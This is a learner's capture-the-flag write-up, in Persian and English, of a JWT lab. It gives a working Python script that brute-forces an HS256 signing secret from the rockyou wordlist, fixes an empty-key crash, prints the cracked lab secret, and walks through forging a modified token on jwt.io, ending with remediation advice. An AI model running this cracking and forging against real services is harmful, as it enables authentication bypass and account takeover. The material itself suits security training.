کاری که توی این lab باید انجام بدم اینه : پیداکردن کلید سری‌ امضای توکن‌ JWT به‌وسیله Brute-Force و تغییر محتوای توکن خود به کمک این کلید.

خب یه لیست rockyou داده شده، ولی مساله اینجاست که نمیدونم با چه ابزاری باید از brute force استفاده کنم و اصلا چه راهکاری وجود داره. صرفا تا اینجا JWT رو decode کردم و محتواش رو دارم. البته از محتواش چیز زیادی دست گیرم نشد. صرفا فهمیدم رمزنگاری به روش HS256 هستش.

خب همین الان یه کد پایتون داخل درسنامه توجه ام رو جلب کردم. برم باهاش درگیر بشم!

خب فکر کنم راه حل این کد باشه ولی هنوز به نتیجه ای بهش نرسیدم (نمیدونم چرا توکن JWT کپی شده از بخش DevTools مربوط به lab رو بهش میدم، فایل rockyou.txt هم بهش میدم، همچنان کلی ارور میده نمیدونم!)


<pre>

# pip install pyjwt
import jwt

def brute_force_jwt(jwt_token, wordlist_file):
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:
        for password in file:
            password = password.strip()
            try:
                decoded = jwt.decode(jwt_token, password, algorithms=["HS256"])
                print(f"[SUCCESS] Secret key found: '{password}'")
                print(f"Decoded Payload: {decoded}")
                return
            except jwt.InvalidTokenError:
                continue
    print("[FAILED] No valid secret key found.")

if __name__ == "__main__":
    jwt_token = input("Enter the JWT token: ").strip()
    wordlist_file = input("Enter the wordlist file path: ").strip()
    brute_force_jwt(jwt_token, wordlist_file)
    
</pre>


این سوال باید حل شود






*(Continuation — appended to my earlier notes on this lab)*

## The Bug in My Original Script

My first version of the brute-force script kept crashing with this error, after successfully trying a bunch of passwords first:

```
jwt.exceptions.InvalidKeyError: HMAC key must not be empty.
```

**Root cause:** the wordlist (`rockyou.txt`) contains at least one blank line. After `.strip()`, that line becomes an empty string `""`. My script then tried to use `""` as the HMAC signing key, and PyJWT explicitly refuses that with `InvalidKeyError` — which is a *different* exception class than the `jwt.InvalidTokenError` I was catching. Since my `except` block only caught `InvalidTokenError`, the empty-key case wasn't handled and crashed the whole script instead of just skipping to the next line.

## Fixed Code

```python
# pip install pyjwt
import jwt  # PyJWT library — provides jwt.decode() and jwt.encode()

def brute_force_jwt(jwt_token, wordlist_file):
    # Open the wordlist file.
    # encoding='utf-8' with errors='ignore' prevents the script from crashing
    # on any malformed/non-UTF-8 bytes that are common in huge real-world
    # wordlists like rockyou.txt.
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:

        # Iterate over the wordlist one line (one candidate password) at a time.
        # Reading line-by-line (instead of loading the whole file into memory)
        # is important here since rockyou.txt has millions of lines.
        for password in file:

            # Remove the trailing newline character (and any stray whitespace)
            # from the current line, so we're left with just the candidate key.
            password = password.strip()

            # --- THE FIX ---
            # Some lines in the wordlist are blank. After strip(), these become
            # an empty string. PyJWT raises InvalidKeyError (not InvalidTokenError)
            # if you try to sign/verify with an empty key, which was crashing
            # the script. So we explicitly skip empty candidates before even
            # attempting to decode.
            if not password:
                continue

            try:
                # Attempt to verify the JWT's signature using the current
                # candidate password as the HMAC secret key.
                # algorithms=["HS256"] restricts verification to the HS256
                # algorithm only (matches what we saw when we decoded the
                # token's header earlier: {"alg": "HS256", "typ": "JWT"}).
                #
                # If the key is WRONG, jwt.decode() raises an exception
                # (signature mismatch) and we move on to the next password.
                # If the key is RIGHT, decode() succeeds and returns the
                # decoded payload dict.
                decoded = jwt.decode(jwt_token, password, algorithms=["HS256"])

                # If we reach this line, no exception was raised — meaning
                # the signature check passed, so 'password' is the correct
                # secret key used by the server.
                print(f"[SUCCESS] Secret key found: '{password}'")
                print(f"Decoded Payload: {decoded}")

                # Stop immediately once found — no need to keep checking
                # the rest of the (potentially huge) wordlist.
                return

            except jwt.InvalidTokenError:
                # This catches signature verification failures (wrong key)
                # and other generic invalid-token issues. We simply continue
                # to the next candidate password in the wordlist.
                continue

    # This only runs if the for-loop finishes without ever hitting 'return',
    # i.e. we tried every single word in the wordlist and none of them worked.
    print("[FAILED] No valid secret key found.")


if __name__ == "__main__":
    # Prompt the user (me) to paste in the JWT captured from DevTools.
    jwt_token = input("Enter the JWT token: ").strip()

    # Prompt for the path to the wordlist file (rockyou.txt in this case).
    wordlist_file = input("Enter the wordlist file path: ").strip()

    # Kick off the brute-force attempt.
    brute_force_jwt(jwt_token, wordlist_file)
```

**Result after the fix:**
```
[SUCCESS] Secret key found: 'quera1'
Decoded Payload: {'lab': 'jwt', 'exp': 1784038375}
```

## Continuing the Thought Process — From Secret Key to Forged Token

### Step — Deciding how to forge the new token
Once I had the secret (`quera1`), the remaining task was to build a **new JWT** with an added `"hacked": true` field in the payload, signed with that same secret. I decided to use **[jwt.io](https://jwt.io)** instead — it lets you edit the payload visually and instantly re-signs the token as you type, which is faster for a one-off forgery like this, even though it could be done with a python code as well.

### Step — Rebuilding the payload on jwt.io
1. Pasted the original captured token into the "Encoded" box on the left.
2. jwt.io automatically decoded it and showed the Header and Payload separately.
3. In the **Payload** box, I added the new field to the existing claims:
   ```json
   {
     "lab": "jwt",
     "exp": 1784038375,
     "hacked": true
   }
   ```
4. I also double-checked the `exp` (expiration) timestamp wasn't already in the past — an expired token would fail server-side validation even with a correct signature.

### Step — First failed submission: forgot the secret field
I submitted the token to the lab and got:
```
Signature verification failed
```
The payload edit itself was correct — the mistake was that I never actually entered the secret key into jwt.io's signature-verification field on the right side. Without setting it, jwt.io was still signing with its own default placeholder secret (something like `your-256-bit-secret`), not `quera1`, so the server rejected the signature.

### Step — Fix: entering the secret correctly
Scrolling down under the "JWT Signature" section, I found the secret input field (still holding the default placeholder text). I:
1. Cleared the placeholder value.
2. Typed in `quera1`.
3. Confirmed no "secret is base64 encoded" toggle was accidentally enabled (which would have made jwt.io base64-decode `quera1` before using it — producing a completely different, wrong key).

As soon as the correct secret was entered, jwt.io automatically regenerated the **Encoded JWT** on the left using the correct signature.

### Step — Success
I copied the newly signed token from jwt.io and pasted it into the lab's token input field. The lab accepted it and the challenge was marked complete.

## Key Takeaways
- Different exception types in a library (like `InvalidKeyError` vs `InvalidTokenError` in PyJWT) need to be handled explicitly — a broad wordlist will eventually contain edge cases (like blank lines) that trigger errors you didn't originally anticipate.
- Weak/short/dictionary-based HMAC secrets for JWTs are directly brute-forceable offline once you have a captured token — this is exactly why RFC 7518 recommends HMAC keys of at least 32 bytes for HS256.
- Tools like jwt.io are legitimate and fast for manually forging a token once the secret is known, but every field (payload **and** the signature secret) needs to be set correctly — a correct payload with the wrong/default secret still fails verification.
- Always sanity-check the `exp` claim when forging a token; an otherwise-perfect forgery can still be rejected if it's expired.

## Remediation
- Use a cryptographically random, sufficiently long secret (≥32 bytes for HS256) — never a short dictionary word.
- Consider using asymmetric signing (RS256/ES256) for JWTs where the verifying party doesn't need to also be able to sign tokens, removing the shared-secret brute-force risk entirely.
- Rotate signing secrets periodically and invalidate old tokens on rotation.

---
*Lab completed — JWT secret brute-force module.*
